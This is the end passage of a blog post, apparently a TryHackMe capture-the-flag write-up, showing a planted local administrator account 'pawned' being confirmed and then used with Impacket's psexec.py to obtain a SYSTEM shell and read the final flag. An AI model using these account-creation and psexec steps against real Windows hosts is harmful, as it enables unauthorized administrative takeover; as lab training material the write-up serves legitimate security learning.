+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\scripts> type log.txt
+Last run: 07/07/2025 12:21:32
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\scripts> type log.txt
+Last run: 07/07/2025 12:22:18
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>A few moments later, I check for the new user:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\scripts> net user pawned
+User name                    pawned
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            7/7/2025 12:22:17 PM
+Password expires             8/18/2025 12:22:17 PM
+Password changeable          7/8/2025 12:22:17 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The user <code>pawned</code> now exists and is a local administrator. It&rsquo;s game over. I use <code>psexec.py</code> to get a system shell:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">psexec.py</span> <span class="string">'windcorp.thm/pawned:Password123!@'</span>$target 
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-info">[*]</span> Requesting shares on 10.10.96.189.....
+<span class="indicator-info">[*]</span> Found writable share ADMIN$
+<span class="indicator-info">[*]</span> Uploading file HuPxjwiJ.exe
+<span class="indicator-info">[*]</span> Opening SVCManager on 10.10.96.189.....
+<span class="indicator-info">[*]</span> Creating service qeel on 10.10.96.189.....
+<span class="indicator-info">[*]</span> Starting service qeel.....
+<span class="indicator-warning">[!]</span> Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1158]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> cd \users\administrator\desktop
+
+C:\Users\Administrator\Desktop> ls  
+<span class="string">'ls'</span> is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 84E1-0562
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/10/2020  04:17 AM    <span<><</span>DIR>          .
+05/10/2020  04:17 AM    <span<><</span>DIR>          ..
+05/07/2020  01:22 AM                47 Flag3.txt
+               1 File(s)             47 bytes
+               2 Dir(s)  44,681,650,176 bytes free
+
+C:\Users\Administrator\Desktop> type Flag3.txt
+THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+Flag 3: THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xblivion.dev/tags/walkthrough/">Walkthrough</a></li>
+      <li><a href="https://0xblivion.dev/tags/writeup/">Writeup</a></li>
+      <li><a href="https://0xblivion.dev/tags/tryhackme/">Tryhackme</a></li>
+      <li><a href="https://0xblivion.dev/tags/windows/">Windows</a></li>
+      <li><a href="https://0xblivion.dev/tags/active-directory/">Active-Directory</a></li>
+      <li><a href="https://0xblivion.dev/tags/password-reset/">Password-Reset</a></li>
+      <li><a href="https://0xblivion.dev/tags/xss/">Xss</a></li>
+      <li><a href="https://0xblivion.dev/tags/cve-2020-12772/">Cve-2020-12772</a></li>
+      <li><a href="https://0xblivion.dev/tags/ntlm/">Ntlm</a></li>
+      <li><a href="https://0xblivion.dev/tags/hash-cracking/">Hash-Cracking</a></li>
+      <li><a href="https://0xblivion.dev/tags/privilege-escalation/">Privilege-Escalation</a></li>
+      <li><a href="https://0xblivion.dev/tags/account-operators/">Account-Operators</a></li>
+      <li><a href="https://0xblivion.dev/tags/scheduled-task/">Scheduled-Task</a></li>
+      <li><a href="https://0xblivion.dev/tags/command-injection/">Command-Injection</a></li>
+      <li><a href="https://0xblivion.dev/tags/nmap/">Nmap,</a></li>
+      <li><a href="https://0xblivion.dev/tags/kerberos/">Kerberos</a></li>
+      <li><a href="https://0xblivion.dev/tags/responder/">Responder</a></li>
+      <li><a href="https://0xblivion.dev/tags/docker/">Docker</a></li>
+      <li><a href="https://0xblivion.dev/tags/spark/">Spark</a></li>
+      <li><a href="https://0xblivion.dev/tags/xmpp/">Xmpp</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://0xblivion.dev/posts/htb/linux/medium/hackthebox-cat-writeup/">
+    <span class="title">Next »</span>
+    <br>
+    <span>HackTheBox - Cat Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://0xblivion.dev/">0xblivion.dev</a></span>
+
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
